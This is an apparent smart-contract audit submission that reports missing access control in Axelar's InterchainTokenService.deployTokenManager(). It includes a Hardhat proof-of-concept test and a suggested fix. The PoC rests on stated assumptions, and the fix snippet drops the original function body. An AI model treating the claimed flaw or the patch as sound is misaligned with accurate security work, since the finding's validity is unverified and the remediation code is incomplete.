# Vulnerability details

## Where is bug

[deployTokenManager()](https://github.com/code-423n4/2024-08-axelar-network/blob/main/interchain-token-service/contracts/InterchainTokenService.sol#L286) of [InterchainTokenService.sol](https://github.com/code-423n4/2024-08-axelar-network/blob/main/interchain-token-service/contracts/InterchainTokenService.sol) 

## Impact

So the issue is `deployTokenManager()` allows unauthorized users to partially deploy token managers, polluting the contract state with invalid data. While these token managers are marked as invalid, given current set up, their data is still stored,  which enables the following impacts:
1. Unauthorized state changes 
2. Pointless data within the contract (token managers that exist but are not valid)
3. Exploitation in combination with other functions, if other vectors are open, that might not properly check token manager validity
4. Pointless gas consumption and blockchain "bloat" of sorts.

Located here: 

```solidity
function deployTokenManager(
    bytes32 salt,
    string calldata destinationChain,
    TokenManagerType tokenManagerType,
    bytes calldata params,
    uint256 gasValue
) external payable whenNotPaused returns (bytes32 tokenId) {
    // Missing access control check
    if (tokenManagerType == TokenManagerType.NATIVE_INTERCHAIN_TOKEN) revert CannotDeploy(tokenManagerType);

    address deployer = msg.sender;

    if (deployer == interchainTokenFactory) {
        deployer = TOKEN_FACTORY_DEPLOYER;
    }

    tokenId = interchainTokenId(deployer, salt);

    emit InterchainTokenIdClaimed(tokenId, deployer, salt);

    if (bytes(destinationChain).length == 0) {
        _deployTokenManager(tokenId, tokenManagerType, params);
    } else {
        _deployRemoteTokenManager(tokenId, destinationChain, gasValue, tokenManagerType, params);
    }
}
```

## Proof of Concept

```javascript
describe("InterchainTokenService bug", function() {
  let InterchainTokenService, service, owner, attacker;

  beforeEach(async function() {
    [owner, attacker] = await ethers.getSigners();

    InterchainTokenService = await ethers.getContractFactory("InterchainTokenService");
    service = await InterchainTokenService.deploy(
      owner.address, // tokenManagerDeployer
      owner.address, // interchainTokenDeployer
      owner.address, // gateway
      owner.address, // gasService
      owner.address, // interchainTokenFactory
      "TestChain",
      owner.address, // tokenManager
      owner.address, // tokenHandler
      owner.address  // gatewayCaller
    );
    await service.deployed();
  });

  it("allows partial unauthorized token manager deployment", async function() {
    const salt = ethers.utils.randomBytes(32);
    const tokenManagerType = 2; // Assuming 2 is a valid type
    const params = ethers.utils.defaultAbiCoder.encode(
      ['address', 'address'],
      [attacker.address, attacker.address]
    );

    // Attempt to deploy a token manager as an unauthorized user
    await expect(
      service.connect(attacker).deployTokenManager(
        salt,
        "",
        tokenManagerType,
        params,
        0
      )
    ).to.not.be.reverted;

    console.log("VULNERABILITY: Unauthorized token manager deployment partially succeeded");

    // Verify the deployment
    const tokenId = await service.interchainTokenId(attacker.address, salt);
    const tokenManagerAddress = await service.tokenManagerAddress(tokenId);
    
    console.log(`Deployed Token ID: ${tokenId}`);
    console.log(`Deployed Token Manager Address: ${tokenManagerAddress}`);

    // Check if the deployed token manager is valid
    const isValid = await service.validTokenManagerAddress(tokenId).catch(e => false);
    console.log(`Is Token Manager valid: ${isValid}`);

    expect(isValid).to.be.false;
    expect(tokenManagerAddress).to.not.equal(ethers.constants.AddressZero);

    console.log("CRITICAL: Contract state polluted with invalid token manager data");
  });
});
```

## Recommended Mitigation Steps

1. Insert in better and more strict access control at the beginning of the `deployTokenManager()`:

```solidity
function deployTokenManager(
    bytes32 salt,
    string calldata destinationChain,
    TokenManagerType tokenManagerType,
    bytes calldata params,
    uint256 gasValue
) external payable whenNotPaused returns (bytes32 tokenId) {
    require(msg.sender == owner() || isOperator(msg.sender), "Unauthorized");
    // add this ^ to prevent the bug
}
```

- Extra mitigations: Use two-step deployment process where token managers are proposed and then activated by an authorized party (centralized but mitigates). Use more validation for all parameters before proceeding with deployment.  Use a mapping to track valid token managers and use it in `validTokenManagerAddress()` .
